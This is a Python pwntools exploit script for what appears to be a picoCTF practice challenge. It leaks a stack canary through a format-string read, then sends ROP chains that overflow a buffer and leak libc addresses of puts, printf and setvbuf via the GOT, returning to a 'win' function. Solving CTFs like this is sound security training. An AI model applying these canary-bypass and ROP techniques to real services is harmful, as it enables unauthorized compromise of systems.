from pwn import *

elf = context.binary = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
context.log_level = 'debug'
context.terminal = 'kitty'

rop = ROP(elf)

number = -3727 
# number = -2495
canary_offset = 135
offset = 512

p = remote("jupiter.challenges.picoctf.org", 57529)
# gdb.attach(p)

p.sendlineafter('?\n', str(number).encode())
p.sendlineafter('Name?', "%{}$p".format(canary_offset).encode())
p.recvuntil('Congrats: ')
canary = int(p.recvline().decode().strip('\n'), 16)
log.info("canary, %#x", canary)

p.sendlineafter('?\n', str(number).encode())

rop.raw(b'A' * offset)
rop.raw(canary)
rop.raw(b'A' * 12)
rop.raw(elf.plt.puts)
rop.raw(elf.sym.win)
rop.raw(elf.got.puts)

print(rop.dump())

p.sendlineafter('Name?', rop.chain())

p.recvuntil('A\n\n')
puts_leak = u32(p.recv(4))

rop2 = ROP(elf)
rop2.raw(b'A' * offset)
rop2.raw(canary)
rop2.raw(b'A' * 12)
rop2.raw(elf.plt.puts)
rop2.raw(elf.sym.win)
rop2.raw(elf.got.printf)

p.sendlineafter('Name?', rop2.chain())

p.recvuntil('A\n\n')
printf_leak = u32(p.recv(4))

p.sendlineafter('Name?', rop2.chain())

rop3 = ROP(elf)
rop3.raw(b'A' * offset)
rop3.raw(canary)
rop3.raw(b'A' * 12)
rop3.raw(elf.plt.puts)
rop3.raw(elf.sym.win)
rop3.raw(elf.got.setvbuf)

p.sendlineafter('Name?', rop3.chain())

p.recvuntil('A\n\n')
setvbuf_leak = u32(p.recv(4))

p.sendlineafter('Name?', rop3.chain())

log.info("printf, %#x", printf_leak)
log.info("puts, %#x", puts_leak)
log.info("setvbuf, %#x", setvbuf_leak)
